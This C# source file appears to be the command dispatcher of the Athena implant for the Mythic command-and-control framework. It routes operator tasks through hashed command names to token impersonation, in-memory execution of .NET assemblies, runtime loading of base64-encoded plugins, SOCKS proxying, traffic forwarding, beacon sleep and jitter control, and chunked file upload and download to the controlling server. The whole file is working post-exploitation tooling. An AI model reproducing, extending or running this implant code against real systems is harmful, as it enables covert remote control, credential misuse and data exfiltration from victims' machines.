using Athena.Models.Athena.Commands;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Text;
using Athena.Plugins;
using Athena.Models.Config;
using System.Text.Json;
using Athena.Models;
using System.Diagnostics;

namespace Athena.Commands
{
    public class CommandHandler
    {
        public delegate void SetSleepAndJitterHandler(object sender, TaskEventArgs e);
        public delegate void SetForwarderHandler(object sender, ProfileEventArgs e);
        public delegate void SetProfileHandler(object sender, ProfileEventArgs e);
        public delegate void StartForwarderHandler(object sender, TaskEventArgs e);
        public delegate void StopForwarderHandler(object sender, TaskEventArgs e);
        public delegate void StartSocksHandler(object sender, TaskEventArgs e);
        public delegate void StopSocksHandler(object sender, TaskEventArgs e);
        public delegate void ExitRequestedHandler(object sender, TaskEventArgs e);

        public event EventHandler<TaskEventArgs> SetSleepAndJitter;
        public event EventHandler<ProfileEventArgs> SetForwarder;
        public event EventHandler<ProfileEventArgs> SetProfile;
        public event EventHandler<TaskEventArgs> StartForwarder;
        public event EventHandler<TaskEventArgs> StopForwarder;
        public event EventHandler<TaskEventArgs> StartSocks;
        public event EventHandler<TaskEventArgs> StopSocks;
        public event EventHandler<TaskEventArgs> ExitRequested;
        private AssemblyHandler assemblyHandler { get; }
        private DownloadHandler downloadHandler { get; }
        private UploadHandler uploadHandler { get; }
        private TokenHandler tokenHandler { get; }
        private ConcurrentBag<string> responseResults { get; set; }
        public CommandHandler()
        {
            //PluginHandler.activeJobs = new ConcurrentDictionary<string, MythicJob>();
            this.assemblyHandler = new AssemblyHandler();
            this.downloadHandler = new DownloadHandler();
            this.uploadHandler = new UploadHandler();
            this.responseResults = new ConcurrentBag<string>();
            this.tokenHandler = new TokenHandler();
        }
        /// <summary>
        /// Initiate a task provided by the Mythic server
        /// </summary>
        /// <param name="task">MythicTask object containing the parameters of the task</param>
        public async Task StartJob(MythicTask task)
        {
            MythicJob job = PluginHandler.activeJobs.GetOrAdd(task.id, new MythicJob(task));
            job.started = true; 
            if(task.token != 0)
            {
                Debug.WriteLine($"[{DateTime.Now}] Setting thread impersonation.");
                if (!await this.tokenHandler.ThreadImpersonate(task.token))
                {
                    this.responseResults.Add(new ResponseResult()
                    {
                        task_id = task.id,
                        user_output = "Failed to switch context!",
                        status = "errored",
                        completed = true,
                    }.ToJson());
                    return;
                }
            }

            Debug.WriteLine($"[{DateTime.Now}] Received Job: \"{job.task.command}\" with hash value of {job.task.command.ToHash()}");
            switch (job.task.command.ToHash())
            {
                case "FD456406745D816A45CAE554C788E754": //download
                    if (!await downloadHandler.ContainsJob(job.task.id))
                    {
                        this.responseResults.Add(await downloadHandler.StartDownloadJob(job));
                    }
                    break;
                case "C6E6495DF88816EAC7376920027393A4": //execute-assembly
                    this.responseResults.Add(await assemblyHandler.ExecuteAssembly(job));
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "F24F62EEB789199B9B2E467DF3B1876B": //Exit
                    RequestExit(job);
                    break;
                case "27A06A9E3D5E7F67EB604A39536208C9": //jobs
                    this.responseResults.Add(await this.GetJobs(task.id));
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "363AFEF7C118EEDBD908495180280BB7": //jobkill
                    if (PluginHandler.activeJobs.ContainsKey(task.parameters))
                    {
                        PluginHandler.activeJobs[task.parameters].cancellationtokensource.Cancel();
                        this.responseResults.Add(new ResponseResult
                        {
                            user_output = "Cancelled job",
                            completed = true,
                            task_id = job.task.id,
                        }.ToJson());
                    }
                    else
                    {
                        this.responseResults.Add(new ResponseResult
                        {
                            user_output = "Job doesn't exist",
                            completed = true,
                            task_id = job.task.id,
                            status = "error"
                        }.ToJson());
                    }
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "2A304A1348456CCD2234CD71A81BD338": //link
                    StartInternalForwarder(job); //I could maybe make this a loadable plugin? it may require some changes to how delegates are passed
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "1CDEDE1665F21542BDE8DD9F3C4E362E": //list-profiles
                    this.responseResults.Add(await this.ListProfiles(job));
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    //test
                    break;
                case "EC4D1EB36B22D19728E9D1D23CA84D1C": //load
                    this.responseResults.Add(await this.LoadCommandAsync(job));
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "790C1BE487AC4162A26A760E50AE619A": //load-assembly
                    this.responseResults.Add(await assemblyHandler.LoadAssemblyAsync(job)); //I bet I could make this a plugin by using the current app context
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "E659634F6A18B0CACD0AB3C3A95845A7": //reset-assembly-context
                    this.responseResults.Add(await assemblyHandler.ClearAssemblyLoadContext(job));
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "C9FAB33E9458412C527C3FE8A13EE37D": //sleep
                    UpdateSleepAndJitter(job);
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "3E5A1B3B990187C9FB8E8156CE25C243": //socks
                    //var socksInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters);
                    var socksInfo = Misc.ConvertJsonStringToDict(job.task.parameters);

                    if ((socksInfo["action"]).IsEqualTo("EA2B2676C28C0DB26D39331A336C6B92")) //start
                    {
                        StartSocksProxy(job);
                    }
                    else
                    {
                        StopSocksProxy(job);
                    }
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "5D343B8042C5EE2EA7C892C5ECC16E30": //stop-assembly
                    this.responseResults.Add(new ResponseResult
                    {
                        user_output = "Not implemented yet.",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson());
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "E9B43EE9A9B0FDF6EF393DC0591C11DB": //set-profile
                    SwitchProfile(job);
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "94A08DA1FECBB6E8B46990538C7B50B2": //token
                    //var tokenInfo = JsonSerializer.Deserialize<Dictionary<string, object>>(job.task.parameters);
                    var tokenInfo = Misc.ConvertJsonStringToDict(job.task.parameters);
                    if (String.IsNullOrEmpty(tokenInfo["username"]))
                    {
                        this.responseResults.Add(await this.tokenHandler.ListTokens(job)); //This could definitely be a plugin...I think. Explore tomorrow
                    }
                    else
                    {
                        this.responseResults.Add(await this.tokenHandler.CreateToken(job));
                    }

                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "695630CFC5EB92580FB3E76A0C790E63": //unlink
                    StopInternalForwarder(job);
                    PluginHandler.activeJobs.Remove(task.id, out _); //plugin-able if we move link there
                    break;
                case "F972C1D6198BAF47DD8FD9A05832DB0F": //unload
                    this.responseResults.Add(await assemblyHandler.UnloadCommands(job));
                    PluginHandler.activeJobs.Remove(task.id, out _);
                    break;
                case "76EE3DE97A1B8B903319B7C013D8C877": //upload
                    if(!await downloadHandler.ContainsJob(job.task.id))
                    {
                        this.responseResults.Add(await uploadHandler.StartUploadJob(job));
                    }
                    break;
                default:
                    ResponseResult rr = (ResponseResult)await CheckAndRunPlugin(job);
                    
                    if(rr is not null)
                    {
                        this.responseResults.Add(rr.ToJson());
                        PluginHandler.activeJobs.Remove(task.id, out _);

                    }

                    break;
            }
            if (task.token != 0)
            {
                await this.tokenHandler.ThreadRevert();
            }
        }

        /// <summary>
        /// Switch the active c2 profile
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void SwitchProfile(MythicJob job)
        {
            ProfileEventArgs switchArgs = new ProfileEventArgs(job);
            SetProfile(this, switchArgs);
        }
        /// <summary>
        /// List avialable c2 profiles
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private async Task<string> ListProfiles(MythicJob job)
        {
#if NATIVEAOT
            return new ResponseResult()
            {
                task_id = job.task.id,
                completed = true,
                user_output = "not available in this configuration"
            }.ToJson();
#else
            StringBuilder sb = new StringBuilder();

            try
            {
                var type = typeof(IProfile);
                var types = AppDomain.CurrentDomain.GetAssemblies()
                    .SelectMany(s => s.GetTypes())
                    .Where(p => type.IsAssignableFrom(p) && !p.IsInterface);

                foreach (var prof in types)
                {
                    sb.AppendLine(prof.FullName);
                }
            }
            catch (Exception e)
            {
                sb.AppendLine(e.ToString());
            }

            return new ResponseResult()
            {
                task_id = job.task.id,
                completed = true,
                user_output = sb.ToString()
            }.ToJson();
#endif

        }
        /// <summary>
        /// EventHandler to begin exit
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void RequestExit(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            ExitRequested(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to start socks proxy
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StartSocksProxy(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StartSocks(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to stop socks proxy
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StopSocksProxy(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StopSocks(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to start internal forwarder
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StartInternalForwarder(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StartForwarder(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to stop internal forwarder
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void StopInternalForwarder(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            StopForwarder(this, exitArgs);
        }
        /// <summary>
        /// EventHandler to update sleep and jitter
        /// </summary>
        /// <param name="job">MythicJob to pass with the event</param>
        private void UpdateSleepAndJitter(MythicJob job)
        {
            TaskEventArgs exitArgs = new TaskEventArgs(job);
            SetSleepAndJitter(this, exitArgs);
        }
        /// <summary>
        /// Cancel a currently executing job
        /// </summary>
        /// <param name="task">MythicTask containing the task id to cancel</param>
        public async Task StopJob(MythicTask task)
        {
            //todo
        }
        /// <summary>
        /// Provide a list of repsonses to the MythicClient
        /// </summary>
        public async Task<List<string>> GetResponses()
        {
            List<string> responses = this.responseResults.ToList();
            this.responseResults.Clear();

            //if (this.assemblyHandler.assemblyIsRunning)
            if(PluginHandler.StdIsBusy())
            {
                responses.Add(await this.assemblyHandler.GetAssemblyOutput());
            }

            List<string> results = await PluginHandler.GetResponses();

            responses.AddRange(results);

            return responses;
        }
        /// <summary>
        /// Add a ResponseResult to the response list
        /// </summary>
        /// <param name="response">ResposneResult or inherited object containing the task results</param>
        public async Task AddResponse(string response)
        {
            this.responseResults.Add(response);
        }
        /// <summary>
        /// Add multiple ResponseResult to the response list
        /// </summary>
        /// <param name="response">ResposneResult or inherited object containing the task results</param>
        public async Task AddResponse(List<string> responses)
        {
            List<string> tmpResponse = new List<string>();
            responses.ForEach(response => tmpResponse = this.responseResults.Prepend<string>(response).ToList());
            this.responseResults = new ConcurrentBag<string>(tmpResponse);
        }
        /// <summary>
        /// Get the currently running jobs
        /// </summary>
        /// <param name="task_id">Task ID of the mythic job to respond to</param>
        private async Task<string> GetJobs(string task_id)
        {
            List<JobStatus> jobsStatus = new List<JobStatus>();
            foreach(var j in PluginHandler.activeJobs)
            {
                jobsStatus.Add(j.Value.GetStatus()); 
            }

            return new ResponseResult()
            {
                user_output = JsonSerializer.Serialize(jobsStatus, JobStatusContext.Default.ListJobStatus),
                task_id = task_id,
                completed = true
            }.ToJson();
        }     
        /// <summary>
        /// Check if a plugin is already loaded and execute it
        /// </summary>
        /// <param name="job">MythicJob containing execution parameters</param>
        private async Task<object> CheckAndRunPlugin(MythicJob job)
        {
            Debug.WriteLine($"[{DateTime.Now}] Checking if command is loaded.");
            if (await this.assemblyHandler.IsCommandLoaded(job.task.command))
            {
                Debug.WriteLine($"[{DateTime.Now}] Command is loaded, executing.");
                return await this.assemblyHandler.RunLoadedCommand(job);
            }
            else
            {
                Debug.WriteLine($"[{DateTime.Now}] Command is not loaded.");
                return new ResponseResult()
                {
                    completed = true,
                    user_output = "Plugin not loaded. Please use the load command to load the plugin!",
                    task_id = job.task.id,
                    status = "error",
                };
            }
        }
        
        private async Task<string> LoadCommandAsync(MythicJob job)
        {
            LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
            byte[] buf = await Misc.Base64DecodeToByteArrayAsync(command.asm);
            return await assemblyHandler.LoadCommandAsync(job.task.id, command.command, buf);
        }

        /// <summary>
        /// Begin the next process of the upload task
        /// </summary>
        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
        public async Task HandleUploadPiece(MythicResponseResult response)
        {
            MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
            
            if (uploadJob.cancellationtokensource.IsCancellationRequested)
            {
                PluginHandler.activeJobs.Remove(response.task_id, out _);
                await this.uploadHandler.CompleteUploadJob(response.task_id);
            }

            if(uploadJob.total_chunks == 0)
            {
                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
            }

            if (String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
            {
                this.responseResults.Add(new ResponseResult
                {
                    status = "error",
                    completed = true,
                    task_id = response.task_id,
                    user_output = "Mythic sent no data to upload!"

                }.ToJson());

                return;
            }

            await this.uploadHandler.UploadNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
            uploadJob.chunk_num++;

            UploadResponse ur = new UploadResponse()
            {
                task_id = response.task_id,
                upload = new UploadResponseData
                {
                    chunk_num = uploadJob.chunk_num,
                    file_id = uploadJob.file_id,
                    chunk_size = uploadJob.chunk_size,
                    full_path = uploadJob.path
                }
            };
            if (response.chunk_num == uploadJob.total_chunks)
            {
                ur = new UploadResponse()
                {
                    task_id = response.task_id,
                    upload = new UploadResponseData
                    {
                        file_id = uploadJob.file_id,
                        full_path = uploadJob.path,
                    },
                    completed = true
                };
                Debug.WriteLine($"[{DateTime.Now}] Completing job.");
                await this.uploadHandler.CompleteUploadJob(response.task_id);
                PluginHandler.activeJobs.Remove(response.task_id, out _);
            }
            Debug.WriteLine($"[{DateTime.Now}] Requesting next chunk for file {uploadJob.file_id} ({uploadJob.chunk_num}/{uploadJob.total_chunks})");
            this.responseResults.Add(ur.ToJson());
        }
        /// <summary>
        /// Begin the next process of the download task
        /// </summary>
        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
        public async Task HandleDownloadPiece(MythicResponseResult response)
        {
            MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);
            
            if (downloadJob.cancellationtokensource.IsCancellationRequested)
            {
                PluginHandler.activeJobs.Remove(response.task_id, out _);
                await this.uploadHandler.CompleteUploadJob(response.task_id);
            }

            DownloadResponse dr = new DownloadResponse()
            {
                task_id = response.task_id,
                download = new DownloadResponseData
                {
                    is_screenshot = false,
                    host = ""
                }
            };

            if (String.IsNullOrEmpty(downloadJob.file_id))
            {
                if (string.IsNullOrEmpty(response.file_id))
                {
                    await this.downloadHandler.CompleteDownloadJob(response.task_id);
                    PluginHandler.activeJobs.Remove(response.task_id, out _);
                    dr.status = "error";
                    dr.user_output = "No file_id received";
                    dr.completed = true;

                    this.responseResults.Add(dr.ToJson());
                    return;
                }

                downloadJob.file_id = response.file_id;
            }

            if(response.status != "success")
            {
                dr.file_id = downloadJob.file_id;
                dr.download.chunk_num = downloadJob.chunk_num;
                Debug.WriteLine($"[{DateTime.Now}] Handling next chunk for file {downloadJob.file_id} ({downloadJob.chunk_num}/{downloadJob.total_chunks})");

                dr.download.chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob);

                this.responseResults.Add(dr.ToJson());
                return;
            }


            downloadJob.chunk_num++;
            dr.file_id = downloadJob.file_id;
            dr.status = "processed";
            dr.user_output = String.Empty;
            dr.download.full_path = downloadJob.path;
            dr.download.total_chunks = -1;
            dr.download.file_id = downloadJob.file_id;
            dr.download.chunk_num = downloadJob.chunk_num;
            dr.download.chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob);
            Debug.WriteLine($"[{DateTime.Now}] Handling next chunk for file {downloadJob.file_id} ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
            if (downloadJob.chunk_num == downloadJob.total_chunks)
            {
                dr.status = String.Empty;
                dr.completed = true;
                await this.downloadHandler.CompleteDownloadJob(response.task_id);
                PluginHandler.activeJobs.Remove(response.task_id, out _);
            }

            this.responseResults.Add(dr.ToJson());
        }
        /// <summary>
        /// Check if an upload job exists
        /// </summary>
        /// <param name="task_id">Task ID of the mythic job to respond to</param>
        public async Task<bool> HasUploadJob(string task_id)
        {
            return await this.uploadHandler.ContainsJob(task_id);
        }
        /// <summary>
        /// Check if a download job exists
        /// </summary>
        /// <param name="task_id">Task ID of the mythic job to respond to</param>
        public async Task<bool> HasDownloadJob(string task_id)
        {
            return await this.downloadHandler.ContainsJob(task_id);
        }   
    }
}
